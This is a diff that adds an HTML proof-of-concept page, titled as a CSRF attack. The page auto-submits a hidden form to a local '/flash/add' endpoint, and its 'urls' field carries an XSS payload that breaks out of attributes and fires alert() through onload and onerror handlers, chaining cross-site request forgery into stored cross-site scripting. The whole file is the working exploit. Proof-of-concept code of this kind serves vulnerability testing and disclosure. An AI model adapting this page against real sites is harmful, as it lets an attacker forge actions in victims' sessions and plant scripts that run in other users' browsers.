@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack PoC</title>
+</head>
+<body>
+  <form id="csrfForm" action="http://127.0.0.1:8000/flash/add" method="POST">
+    <input type="hidden" name="package" value="CSRF_TO_STORED_XSS-NEW">
+    <input type="hidden" name="urls" id="urlsInput">
+    <input type="hidden" name="passwords" value="secret123">
+  </form>
+
+  <script>
+    var x = `https://google.com?"'onload=alert();//'/><img/src='x'onerror=alert()//>`;
+    document.getElementById('urlsInput').value = x;
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
